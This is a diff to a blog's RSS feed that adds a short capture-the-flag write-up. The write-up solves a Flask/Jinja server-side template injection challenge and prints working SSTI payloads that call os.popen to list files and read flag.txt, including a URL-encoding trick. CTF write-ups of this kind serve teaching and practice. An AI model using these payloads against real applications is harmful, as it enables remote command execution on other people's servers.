@@ -6,7 +6,24 @@
         <description>Recent content in web on phire heavy industries</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
-        <lastBuildDate>Sun, 04 Oct 2020 00:00:00 +0000</lastBuildDate><atom:link href="https://www.phireheavyindustries.com\"/tags/web/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Tue, 24 May 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://www.phireheavyindustries.com\"/tags/web/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>Eternal loop</title>
+        <link>https://www.phireheavyindustries.com&#34;/p/eternal-loop/</link>
+        <pubDate>Tue, 24 May 2022 00:00:00 +0000</pubDate>
+        
+        <guid>https://www.phireheavyindustries.com&#34;/p/eternal-loop/</guid>
+        <description>&lt;p&gt;&lt;em&gt;Can you exploit this simple mistake?&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;An easy challenge, i struggled with the #SSTI part as i wasn&amp;rsquo;t enconding the command properly. Using burpsuite to make it easier to manipulate the url i first tried:&lt;/p&gt;
+&lt;p&gt;`{{request.application.&lt;strong&gt;globals&lt;/strong&gt;.&lt;strong&gt;builtins&lt;/strong&gt;.&lt;strong&gt;import&lt;/strong&gt;(&amp;lsquo;os&amp;rsquo;).popen(&amp;ldquo;ls&amp;rdquo;).read()}}&lt;/p&gt;
+&lt;p&gt;This got me the listing for the folder, which presented a flag.txt file. I then tried to read that file with cat:&lt;/p&gt;
+&lt;p&gt;`{{request.application.&lt;strong&gt;globals&lt;/strong&gt;.&lt;strong&gt;builtins&lt;/strong&gt;.&lt;strong&gt;import&lt;/strong&gt;(&amp;lsquo;os&amp;rsquo;).popen(&amp;ldquo;cat flag.txt&amp;rdquo;).read()}}&lt;/p&gt;
+&lt;p&gt;This resulted in a server error. I then tried several other types of injection, but none of them worked. Until i remembered that the space in the cat command was probably causing the problem, and had to encode it as an url
+:&lt;/p&gt;
+&lt;p&gt;`{{request.application.&lt;strong&gt;globals&lt;/strong&gt;.&lt;strong&gt;builtins&lt;/strong&gt;.&lt;strong&gt;import&lt;/strong&gt;(&amp;lsquo;os&amp;rsquo;).popen(&amp;ldquo;cat%20flag.txt&amp;rdquo;).read()}&lt;/p&gt;
+&lt;p&gt;This prints the flag on the page.&lt;/p&gt;
+</description>
+        </item>
+        <item>
         <title>chuppy</title>
         <link>https://www.phireheavyindustries.com&#34;/p/chuppy/</link>
         <pubDate>Sun, 04 Oct 2020 00:00:00 +0000</pubDate>
